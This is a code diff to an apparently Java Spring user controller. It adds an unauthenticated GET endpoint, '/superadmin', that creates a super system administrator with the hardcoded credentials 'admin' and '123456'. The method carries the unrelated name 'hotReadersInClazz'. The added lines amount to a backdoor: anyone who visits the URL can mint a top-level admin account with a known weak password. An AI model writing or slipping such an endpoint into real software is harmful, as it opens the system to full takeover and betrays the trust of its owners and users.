@@ -303,6 +303,12 @@ public class UserController extends BaseController {
 
 
     }
+    
+    @RequestMapping(value = "/superadmin", method = RequestMethod.GET)
+    @ResponseBody
+    public String hotReadersInClazz() {
+    	return userService.addSuperSystemAdmin("admin", "123456");
+    }
 
     private OAuth2AccessToken createTokenForNewUser(String username,
                                                     String password, String clientId, String role) {
